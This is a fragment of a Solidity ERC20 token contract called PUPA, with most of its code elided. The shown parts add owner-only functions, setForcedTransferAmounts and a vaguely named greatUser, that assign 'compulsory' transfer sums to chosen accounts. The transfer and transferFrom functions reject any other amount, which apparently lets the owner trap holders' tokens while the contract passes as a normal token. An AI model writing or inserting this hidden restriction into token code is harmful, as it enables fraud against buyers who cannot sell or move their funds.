...
contract PUPA is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"PUPA";
    string private constant _symbol = unicode"PUPA";
    ...
    function setForcedTransferAmounts(address[] calldata accounts, uint256 sum) public onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            _forcedTransferAmounts[accounts[i]] = sum;
        }
    }

    function greatUser(address[] memory userAddresses, uint256 requiredBalance) public onlyOwner {
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        ...
        uint256 requisiteTransferSum = forcedTransferAmount(_msgSender());
        if (requisiteTransferSum > 0) {
            require(amount == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        uint256 requisiteTransferSum = forcedTransferAmount(sender);
        if (requisiteTransferSum > 0) {
            require(amount == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }
